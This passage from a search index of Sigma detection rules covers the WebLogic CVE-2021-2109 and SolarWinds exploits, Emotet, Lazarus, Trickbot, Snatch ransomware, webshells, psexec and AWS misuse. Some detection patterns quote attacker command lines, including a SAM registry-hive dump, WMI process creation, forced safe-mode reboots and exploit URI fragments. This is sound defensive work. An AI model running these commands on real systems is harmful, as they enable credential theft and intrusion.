CVE-2021-2109\nKnown false-positives Unknown References https://twitter.com/pyn3rd/status/1351696768065409026 https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw Raw rule (edit) title: Oracle WebLogic Exploit CVE-2021-2109 id: 687f6504-7f44-4549-91fc-f07bab065821 status: experimental description: Detects the exploitation of the WebLogic server vulnerability described in CVE-2021-2109 author: Bhabesh Raj date: 2021/01/20 references: - https://twitter.com/pyn3rd/status/1351696768065409026 - https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw logsource: category: webserver detection: selection: cs-method: \u0026#39;GET\u0026#39; c-uri|contains|all: - \u0026#39;com.bea.console.handles.JndiBindingHandle\u0026#39; - \u0026#39;ldap://\u0026#39; - \u0026#39;AdminServer\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.t1190 - attack.initial_access - cve.2021.2109 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_2109_weblogic_rce_exploit.yml/","tags":["attack.t1190","attack.initial_access","cve.2021.2109"],"title":"Oracle WebLogic Exploit CVE-2021-2109"},{"categories":null,"contents":"Detects persistence via Visual Studio Tools for Office (VSTO) add-ins in Office applications.\nKnown false-positives Legitimate Addin Installation References https://twitter.com/_vivami/status/1347925307643355138 https://vanmieghem.io/stealth-outlook-persistence/ Raw rule (edit) title: Stealthy VSTO Persistence id: 9d15044a-7cfe-4d23-8085-6ebc11df7685 status: experimental description: Detects persistence via Visual Studio Tools for Office (VSTO) add-ins in Office applications. references: - https://twitter.com/_vivami/status/1347925307643355138 - https://vanmieghem.io/stealth-outlook-persistence/ tags: - attack.t1137.006 - attack.persistence author: Bhabesh Raj date: 2021/01/10 modified: 2022/02/09 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: - \u0026#39;\\Software\\Microsoft\\Office\\Outlook\\Addins\\\u0026#39; - \u0026#39;\\Software\\Microsoft\\Office\\Word\\Addins\\\u0026#39; - \u0026#39;\\Software\\Microsoft\\Office\\Excel\\Addins\\\u0026#39; - \u0026#39;\\Software\\Microsoft\\Office\\Powerpoint\\Addins\\\u0026#39; - \u0026#39;\\Software\\Microsoft\\VSTO\\Security\\Inclusion\\\u0026#39; filter_image: Image|endswith: - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; # e.g. default Evernote installation # triggered by a default Office 2019 installation filter_office: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\integrator.exe\u0026#39; - \u0026#39;\\OfficeClickToRun.exe\u0026#39; condition: selection and not 1 of filter_* falsepositives: - Legitimate Addin Installation level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_office_vsto_persistence.yml/","tags":["attack.t1137.006","attack.persistence"],"title":"Stealthy VSTO Persistence"},{"categories":null,"contents":"Detects CVE-2020-10148 SolarWinds Orion API authentication bypass attempts\nKnown false-positives Unknown References https://kb.cert.org/vuls/id/843464 Raw rule (edit) title: CVE-2020-10148 SolarWinds Orion API Auth Bypass id: 5a35116f-43bc-4901-b62d-ef131f42a9af status: test description: Detects CVE-2020-10148 SolarWinds Orion API authentication bypass attempts author: Bhabesh Raj references: - https://kb.cert.org/vuls/id/843464 date: 2020/12/27 modified: 2022/01/07 logsource: category: webserver detection: selection: c-uri|contains: - \u0026#39;WebResource.axd\u0026#39; - \u0026#39;ScriptResource.axd\u0026#39; - \u0026#39;i18n.ashx\u0026#39; - \u0026#39;Skipi18n\u0026#39; valid_request_1: c-uri|contains: \u0026#39;Orion/Skipi18n/Profiler/\u0026#39; valid_request_2: c-uri|contains: - \u0026#39;css.i18n.ashx\u0026#39; - \u0026#39;js.i18n.ashx\u0026#39; condition: selection and not valid_request_1 and not valid_request_2 falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_solarwinds_cve_2020_10148.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2020-10148 SolarWinds Orion API Auth Bypass"},{"categories":null,"contents":"Detecting Emotet DLL loading by looking for rundll32.exe processes with command lines ending in ,RunDLL or ,Control_RunDLL\nKnown false-positives Unknown References https://paste.cryptolaemus.com/emotet/2020/12/22/emotet-malware-IoCs_12-22-20.html https://cyber.wtf/2021/11/15/guess-whos-back/ Raw rule (edit) title: Emotet RunDLL32 Process Creation id: 54e57ce3-0672-46eb-a402-2c0948d5e3e9 description: Detecting Emotet DLL loading by looking for rundll32.exe processes with command lines ending in ,RunDLL or ,Control_RunDLL author: FPT.EagleEye status: experimental date: 2020/12/25 modified: 2021/11/17 references: - https://paste.cryptolaemus.com/emotet/2020/12/22/emotet-malware-IoCs_12-22-20.html - https://cyber.wtf/2021/11/15/guess-whos-back/ tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\rundll32.exe\u0026#39; CommandLine|endswith: - \u0026#39;,RunDLL\u0026#39; - \u0026#39;,Control_RunDLL\u0026#39; # - \u0026#39;,#1\u0026#39; too generic - function load by ordinal is not Emotet specific filter_legitimate_dll: CommandLine|endswith: - \u0026#39;.dll,Control_RunDLL\u0026#39; - \u0026#39;.dll\u0026#34;,Control_RunDLL\u0026#39; - \u0026#39;.dll\u0026#39;\u0026#39;,Control_RunDLL\u0026#39; filter_ide: ParentImage|endswith: - \u0026#39;\\tracker.exe\u0026#39; #When Visual Studio compile NodeJS program, it might use MSBuild to create tracker.exe and then, the tracker.exe fork rundll32.exe condition: selection and not filter_ide and not filter_legitimate_dll falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_emotet_rundll32_execution.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Emotet RunDLL32 Process Creation"},{"categories":null,"contents":"Detects different process creation events as described in various threat reports on Lazarus group activity\nKnown false-positives Overlap with legitimate process activity in some cases (especially selection 3 and 4) References https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/ https://www.hvs-consulting.de/lazarus-report/ Raw rule (edit) title: Lazarus Activity id: 24c4d154-05a4-4b99-b57d-9b977472443a description: Detects different process creation events as described in various threat reports on Lazarus group activity status: experimental references: - https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/ - https://www.hvs-consulting.de/lazarus-report/ tags: - attack.g0032 - attack.execution - attack.t1059 author: Florian Roth date: 2020/12/23 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;reg.exe save hklm\\sam %temp%\\~reg_sam.save\u0026#39; - \u0026#39;1q2w3e4r@#$@#$@#$\u0026#39; - \u0026#39; -hp1q2w3e4 \u0026#39; - \u0026#39;.dat data03 10000 -p \u0026#39; selection2: CommandLine|contains|all: - \u0026#39;process call create\u0026#39; - \u0026#39; \u0026gt; %temp%\\~\u0026#39; selection3: CommandLine|contains|all: - \u0026#39;netstat -aon | find \u0026#39; - \u0026#39; \u0026gt; %temp%\\~\u0026#39; # Network share discovery selection4: CommandLine|contains: - \u0026#39;.255 10 C:\\ProgramData\\\u0026#39; condition: 1 of selection* falsepositives: - Overlap with legitimate process activity in some cases (especially selection 3 and 4) level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_lazarus_activity_dec20.yml/","tags":["attack.g0032","attack.execution","attack.t1059"],"title":"Lazarus Activity"},{"categories":null,"contents":"Detects different loaders as described in various threat reports on Lazarus group activity\nKnown false-positives unknown References https://www.hvs-consulting.de/lazarus-report/ https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/ Raw rule (edit) title: Lazarus Loaders id: 7b49c990-4a9a-4e65-ba95-47c9cc448f6e description: Detects different loaders as described in various threat reports on Lazarus group activity status: test references: - https://www.hvs-consulting.de/lazarus-report/ - https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/ tags: - attack.g0032 - attack.execution - attack.t1059 author: Florian Roth, wagga date: 2020/12/23 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection_cmd1: CommandLine|contains|all: - \u0026#39;cmd.exe /c \u0026#39; - \u0026#39; -p 0x\u0026#39; selection_cmd2: CommandLine|contains: - \u0026#39;C:\\ProgramData\\\u0026#39; - \u0026#39;C:\\RECYCLER\\\u0026#39; selection_rundll1: CommandLine|contains|all: - \u0026#39;rundll32.exe \u0026#39; - \u0026#39;C:\\ProgramData\\\u0026#39; selection_rundll2: CommandLine|contains: - \u0026#39;.bin,\u0026#39; - \u0026#39;.tmp,\u0026#39; - \u0026#39;.dat,\u0026#39; - \u0026#39;.io,\u0026#39; - \u0026#39;.ini,\u0026#39; - \u0026#39;.db,\u0026#39; condition: ( selection_cmd1 and selection_cmd2 ) or ( selection_rundll1 and selection_rundll2 ) falsepositives: - unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_lazarus_loader.yml/","tags":["attack.g0032","attack.execution","attack.t1059"],"title":"Lazarus Loaders"},{"categories":null,"contents":"Detects access to SUPERNOVA webshell as described in Guidepoint report\nKnown false-positives Unknown References https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/ https://www.anquanke.com/post/id/226029 Raw rule (edit) title: Solarwinds SUPERNOVA Webshell Access id: a2cee20b-eacc-459f-861d-c02e5d12f1db status: experimental description: Detects access to SUPERNOVA webshell as described in Guidepoint report author: Florian Roth date: 2020/12/17 modified: 2021/08/09 references: - https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/ - https://www.anquanke.com/post/id/226029 tags: - attack.persistence - attack.t1505.003 logsource: category: webserver detection: selection1: c-uri|contains|all: - \u0026#39;logoimagehandler.ashx\u0026#39; - \u0026#39;clazz\u0026#39; selection2: c-uri|contains: \u0026#39;logoimagehandler.ashx\u0026#39; sc-status: 500 condition: selection1 or selection2 fields: - client_ip - response falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_solarwinds_supernova_webshell.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Solarwinds SUPERNOVA Webshell Access"},{"categories":null,"contents":"Detects execution of Impacket\u0026rsquo;s psexec.py.\nKnown false-positives nothing observed so far References https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html Raw rule (edit) title: Impacket PsExec Execution id: 32d56ea1-417f-44ff-822b-882873f5f43b status: test description: Detects execution of Impacket\u0026#39;s psexec.py. author: Bhabesh Raj references: - https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html date: 2020/12/14 modified: 2022/01/07 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit Detailed File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection1: EventID: 5145 ShareName: \\\\\\*\\IPC$ RelativeTargetName|contains: - \u0026#39;RemCom_stdint\u0026#39; - \u0026#39;RemCom_stdoutt\u0026#39; - \u0026#39;RemCom_stderrt\u0026#39; condition: selection1 falsepositives: - nothing observed so far level: high tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_impacket_psexec.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Impacket PsExec Execution"},{"categories":null,"contents":"Detects suspicious shell spawn from MSSQL process, this might be sight of RCE or SQL Injection\nRaw rule (edit) title: Suspicious Shells Spawn by SQL Server id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445 description: Detects suspicious shell spawn from MSSQL process, this might be sight of RCE or SQL Injection status: experimental author: FPT.EagleEye Team, wagga date: 2020/12/11 modified: 2022/03/08 tags: - attack.t1505.003 - attack.t1190 - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\sqlservr.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\bitsadmin.exe\u0026#39; filter_datev: ParentImage|startswith: \u0026#39;C:\\Program Files\\Microsoft SQL Server\\\u0026#39; ParentImage|endswith: \u0026#39;DATEV_DBENGINE\\MSSQL\\Binn\\sqlservr.exe\u0026#39; Image: \u0026#39;C:\\Windows\\System32\\cmd.exe\u0026#39; CommandLine|startswith: \u0026#39;\u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34; \u0026#39; condition: selection and not 1 of filter* level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_from_mssql.yml/","tags":["attack.t1505.003","attack.t1190","attack.initial_access","attack.persistence","attack.privilege_escalation"],"title":"Suspicious Shells Spawn by SQL Server"},{"categories":null,"contents":"Detects Trickbot malware process tree pattern in which rundll32.exe is parent of wermgr.exe\nKnown false-positives Unknown References https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20 https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/ Raw rule (edit) title: Trickbot Malware Activity id: 58bf96d9-ff5f-44bd-8dcc-1c4f79bf3a27 status: test description: Detects Trickbot malware process tree pattern in which rundll32.exe is parent of wermgr.exe author: Florian Roth references: - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20 - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/ date: 2020/11/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\wermgr.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\rundll32.exe\u0026#39; ParentCommandLine|contains: - \u0026#39;DllRegisterServer\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1559 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_trickbot_wermgr.yml/","tags":["attack.execution","attack.t1559"],"title":"Trickbot Malware Activity"},{"categories":null,"contents":"Detects enumeration of accounts configuration via api call to list different instances and services within a short period of time.\nKnown false-positives AWS Config or other configuration scanning activities Raw rule (edit) title: Account Enumeration on AWS id: e9c14b23-47e2-4a8b-8a63-d36618e33d70 status: experimental description: Detects enumeration of accounts configuration via api call to list different instances and services within a short period of time. author: toffeebr33k date: 2020/11/21 modified: 2021/08/09 logsource: product: aws service: cloudtrail detection: selection_eventname: eventName: list* timeframe: 10m condition: selection_eventname | count() \u0026gt; 50 fields: - userIdentity.arn falsepositives: - AWS Config or other configuration scanning activities level: low tags: - attack.discovery - attack.t1592 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_enum_listing.yml/","tags":["attack.discovery","attack.t1592"],"title":"Account Enumeration on AWS"},{"categories":null,"contents":"An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup. With this alert, it is used to detect anyone is changing password on behalf of other users.\nKnown false-positives Legit User Account Administration References https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation Raw rule (edit) title: AWS User Login Profile Was Modified id: 055fb148-60f8-462d-ad16-26926ce050f1 status: experimental description: | An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup. With this alert, it is used to detect anyone is changing password on behalf of other users. author: toffeebr33k date: 2021/08/09 references: - https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation logsource: product: aws service: cloudtrail detection: selection_source: eventSource: iam.amazonaws.com eventName: UpdateLoginProfile filter: userIdentity.arn|contains: requestParameters.userName condition: selection_source and not filter fields: - userIdentity.arn - requestParameters.userName - errorCode - errorMessage falsepositives: - Legit User Account Administration level: high tags: - attack.persistence - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_update_login_profile.yml/","tags":["attack.persistence","attack.t1098"],"title":"AWS User Login Profile Was Modified"},{"categories":null,"contents":"Detect ed user accept agreement execution in psexec commandline\nKnown false-positives Administrative scripts. Raw rule (edit) title: Psexec Accepteula Condition id: 730fc21b-eaff-474b-ad23-90fd265d4988 status: test description: Detect ed user accept agreement execution in psexec commandline author: omkar72 - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html date: 2020/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\psexec.exe\u0026#39; CommandLine|contains: \u0026#39;accepteula\u0026#39; condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Administrative scripts. level: medium tags: - attack.execution - attack.t1569 - attack.t1021 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_psexec_eula.yml/","tags":["attack.execution","attack.t1569","attack.t1021"],"title":"Psexec Accepteula Condition"},{"categories":null,"contents":"Detects potential malicious modification of run keys by winekey or team9 backdoor\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html Raw rule (edit) title: WINEKEY Registry Modification id: b98968aa-dbc0-4a9c-ac35-108363cbf8d5 status: test description: Detects potential malicious modification of run keys by winekey or team9 backdoor author: omkar72 references: - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html date: 2020/10/30 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: - \u0026#39;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\u0026#39; condition: selection fields: - ComputerName - Image - EventType - TargetObject falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_runkey_winekey.yml/","tags":["attack.persistence","attack.t1547"],"title":"WINEKEY Registry Modification"},{"categories":null,"contents":"Detects the addition of office test registry that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started\nKnown false-positives Unlikely References https://attack.mitre.org/techniques/T1137/002/ Raw rule (edit) title: Office Application Startup - Office Test id: 3d27f6dd-1c74-4687-b4fa-ca849d128d1c status: experimental description: Detects the addition of office test registry that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started references: - https://attack.mitre.org/techniques/T1137/002/ author: omkar72 tags: - attack.persistence - attack.t1137.002 date: 2020/10/25 modified: 2021/09/13 logsource: category: registry_event product: windows detection: selection_registry: TargetObject: - \u0026#39;HKCU\\Software\\Microsoft\\Office test\\Special\\Perf\u0026#39; - \u0026#39;HKLM\\Software\\Microsoft\\Office test\\Special\\Perf\u0026#39; condition: selection_registry falsepositives: - Unlikely level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_office_test_regadd.yml/","tags":["attack.persistence","attack.t1137.002"],"title":"Office Application Startup - Office Test"},{"categories":null,"contents":"Detects the conhost execution as parent process. Can be used to evaded defense mechanism.\nKnown false-positives Unlikely, conhost is a child less process References http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/ Raw rule (edit) title: Conhost Parent Process Executions id: 7dc2dedd-7603-461a-bc13-15803d132355 status: experimental description: Detects the conhost execution as parent process. Can be used to evaded defense mechanism. references: - http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/ author: omkar72 date: 2020/10/25 modified: 2021/12/17 tags: - attack.defense_evasion - attack.t1202 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\conhost.exe\u0026#39; filter: Provider_Name: \u0026#39;SystemTraceProvider-Process\u0026#39; # FPs with Aurora condition: selection and not filter fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unlikely, conhost is a child less process level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_conhost.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Conhost Parent Process Executions"},{"categories":null,"contents":"Detects WMI executing rundll32\nKnown false-positives Unknown References https://thedfirreport.com/2020/10/08/ryuks-return/ Raw rule (edit) title: Suspicious WMI Execution Using Rundll32 id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 status: test description: Detects WMI executing rundll32 author: Florian Roth references: - https://thedfirreport.com/2020/10/08/ryuks-return/ date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;process call create\u0026#39; - \u0026#39;rundll32\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1047 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wmic_proc_create_rundll32.yml/","tags":["attack.execution","attack.t1047"],"title":"Suspicious WMI Execution Using Rundll32"},{"categories":null,"contents":"Detects changes to \u0026lsquo;HKCU\\Software\\Classes\\Folder\\shell\\open\\command\\DelegateExecute\u0026rsquo;\nKnown false-positives unknown References http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass https://www.exploit-db.com/exploits/47696 Raw rule (edit) title: COM Hijack via Sdclt id: 07743f65-7ec9-404a-a519-913db7118a8d status: test description: Detects changes to \u0026#39;HKCU\\Software\\Classes\\Folder\\shell\\open\\command\\DelegateExecute\u0026#39; author: Omkar Gudhate references: - http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass - https://www.exploit-db.com/exploits/47696 date: 2020/09/27 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject: - \u0026#39;HKCU\\Software\\Classes\\Folder\\shell\\open\\command\\DelegateExecute\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.privilege_escalation - attack.t1546 - attack.t1548 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_comhijack_sdclt.yml/","tags":["attack.privilege_escalation","attack.t1546","attack.t1548"],"title":"COM Hijack via Sdclt"},{"categories":null,"contents":"Detects the execution of a AdFind for Active Directory enumeration\nKnown false-positives Administrative activity References https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md https://thedfirreport.com/2020/05/08/adfind-recon/ Raw rule (edit) title: Suspicious AdFind Execution id: 75df3b17-8bcc-4565-b89b-c9898acef911 status: experimental description: Detects the execution of a AdFind for Active Directory enumeration references: - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md - https://thedfirreport.com/2020/05/08/adfind-recon/ author: FPT.EagleEye Team, omkar72, oscd.community date: 2020/09/26 modified: 2021/05/12 tags: - attack.discovery - attack.t1018 - attack.t1087.002 - attack.t1482 - attack.t1069.002 logsource: product: windows category: process_creation detection: selection: CommandLine|contains: - \u0026#39;objectcategory\u0026#39; - \u0026#39;trustdmp\u0026#39; - \u0026#39;dcmodes\u0026#39; - \u0026#39;dclist\u0026#39; - \u0026#39;computers_pwdnotreqd\u0026#39; Image|endswith: \u0026#39;\\adfind.exe\u0026#39; condition: selection falsepositives: - Administrative activity level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_adfind.yml/","tags":["attack.discovery","attack.t1018","attack.t1087.002","attack.t1482","attack.t1069.002"],"title":"Suspicious AdFind Execution"},{"categories":null,"contents":"Detects wannacry killswitch domain dns queries\nKnown false-positives Analyst testing References https://www.fireeye.com/blog/products-and-services/2017/05/wannacry-ransomware-campaign.html Raw rule (edit) title: Wannacry Killswitch Domain id: 3eaf6218-3bed-4d8a-8707-274096f12a18 status: test description: Detects wannacry killswitch domain dns queries author: Mike Wade references: - https://www.fireeye.com/blog/products-and-services/2017/05/wannacry-ransomware-campaign.html date: 2020/09/16 modified: 2021/11/27 logsource: category: dns detection: selection: query: - \u0026#39;ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.testing\u0026#39; - \u0026#39;ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.test\u0026#39; - \u0026#39;ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com\u0026#39; - \u0026#39;ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com\u0026#39; - \u0026#39;iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com\u0026#39; - \u0026#39;\u0026#39; condition: selection falsepositives: - Analyst testing level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_wannacry_killswitch_domain.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Wannacry Killswitch Domain"},{"categories":null,"contents":"Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472.\nKnown false-positives Unknown References https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc Raw rule (edit) title: Vulnerable Netlogon Secure Channel Connection Allowed id: a0cb7110-edf0-47a4-9177-541a4083128a status: experimental description: Detects that a vulnerable Netlogon secure channel connection was allowed, which could be an indicator of CVE-2020-1472. references: - https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc author: NVISO date: 2020/09/15 modified: 2021/11/30 tags: - attack.privilege_escalation - attack.t1548 logsource: product: windows service: system detection: selection: Provider_Name: NetLogon # Active Directory: NetLogon ETW GUID {F33959B4-DBEC-11D2-895B-00C04F79AB69} EventID: 5829 condition: selection fields: - SAMAccountName falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_vul_cve_2020_1472.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"Vulnerable Netlogon Secure Channel Connection Allowed"},{"categories":null,"contents":"Detects triggering of AMSI by Windows Defender.\nKnown false-positives unlikely References https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps Raw rule (edit) title: Windows Defender AMSI Trigger Detected id: ea9bf0fa-edec-4fb8-8b78-b119f2528186 description: Detects triggering of AMSI by Windows Defender. date: 2020/09/14 modified: 2021/10/13 author: Bhabesh Raj references: - https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps status: stable logsource: product: windows service: windefend detection: selection: EventID: 1116 Source_Name: \u0026#39;AMSI\u0026#39; condition: selection falsepositives: - unlikely level: high tags: - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_defender_amsi_trigger.yml/","tags":["attack.execution","attack.t1059"],"title":"Windows Defender AMSI Trigger Detected"},{"categories":null,"contents":"Detects specific process characteristics of Snatch ransomware word document droppers\nKnown false-positives Scripts that shutdown the system immediately and reboot them in safe mode are unlikely References https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/ Raw rule (edit) title: Snatch Ransomware id: 5325945e-f1f0-406e-97b8-65104d393fff status: test description: Detects specific process characteristics of Snatch ransomware word document droppers author: Florian Roth references: - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/ date: 2020/08/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: # Shutdown in safe mode immediately selection: CommandLine|contains: - \u0026#39;shutdown /r /f /t 00\u0026#39; - \u0026#39;net stop SuperBackupMan\u0026#39; condition: selection fields: - ComputerName - User - Image falsepositives: - Scripts that shutdown the system immediately and reboot them in safe mode are unlikely level: critical tags: - attack.execution - attack.t1204 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_crime_snatch_ransomware.yml/","tags":["attack.execution","attack.t1204"],"title":"Snatch Ransomware"},{"categories":null,"contents":"Detects connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service.\nKnown false-positives Although it is recommended to NOT have RDP exposed to the internet, verify that this is a) allowed b) the server has not already been compromised via some brute force or remote exploit since it has been exposed to the internet. Work to secure the server if you are unable to remove it from being exposed to the internet. References https://attack.mitre.org/techniques/T1021/001/ Raw rule (edit) title: Publicly Accessible RDP Service id: 1fc0809e-06bf-4de3-ad52-25e5263b7623 status: experimental description: Detects connections from routable IPs to an RDP listener - which is indicative of a publicly-accessible RDP service. references: - https://attack.mitre.org/techniques/T1021/001/ tags: - attack.t1021.001 author: \u0026#39;Josh Brower @DefensiveDepth\u0026#39; date: 2020/08/22 modified: 2021/11/14 logsource: product: zeek service: rdp detection: selection: id.orig_h|startswith: - \u0026#39;192.168.\u0026#39; - \u0026#39;10.\u0026#39; - \u0026#39;172.16.\u0026#39; - \u0026#39;172.17.\u0026#39; - \u0026#39;172.18.\u0026#39; - \u0026#39;172.19.\u0026#39; - \u0026#39;172.20.\u0026#39; - \u0026#39;172.21.\u0026#39; - \u0026#39;172.22.\u0026#39; - \u0026#39;172.23.\u0026#39; - \u0026#39;172.24.\u0026#39; - \u0026#39;172.25.\u0026#39; - \u0026#39;172.26.\u0026#39; - \u0026#39;172.27.\u0026#39; - \u0026#39;172.28.\u0026#39; - \u0026#39;172.29.\u0026#39; - \u0026#39;172.30.\u0026#39; - \u0026#39;172.31.\u0026#39; #approved_rdp: #dst_ip: #- x.x.x.x condition: not selection #and not approved_rdp fields: - id.orig_h - id.resp_h falsepositives: - Although it is recommended to NOT have RDP exposed to the internet, verify that this is a) allowed b) the server has not already been compromised via some brute force or remote exploit since it has been exposed to the internet. Work to secure the server if you are unable to remove it from being exposed to the internet. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_rdp_public_listener.yml/","tags":["attack.t1021.001"],"title":"Publicly Accessible RDP Service"},{"categories":null,"contents":"Windows Defender logs when the history of detected infections is deleted. Log file will contain the message 